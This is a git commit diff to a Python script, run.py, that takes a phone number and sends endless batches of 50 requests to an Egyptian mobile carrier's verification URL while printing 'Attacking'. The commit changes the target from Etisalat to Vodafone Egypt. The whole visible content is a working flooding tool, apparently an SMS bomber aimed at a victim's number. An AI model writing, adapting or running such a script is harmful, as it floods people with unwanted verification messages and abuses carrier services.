28535ed9e38f01f2f45894c4487810252f1ef084
Saudi444 <58267257+Saudi444@users.noreply.github.com>
2020-12-01 18:25:17 +0200

    Update run.py

--- run.py
+++ run.py
@@ -20,7 +20,7 @@ num = raw_input('Enter Number >>')
 def attack(num):
 	while True:
 			for x in range(50):	
-					url = 'http://www.etisalat.eg/dashboard/verify/'+num+'/ar'
+					url = 'https://web.vodafone.com.eg/dashboard/verify/'+num+'/ar'
 					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
 					response = requests.get(url, headers=headers)
 					print("[+] Attacking ...... [+] ")
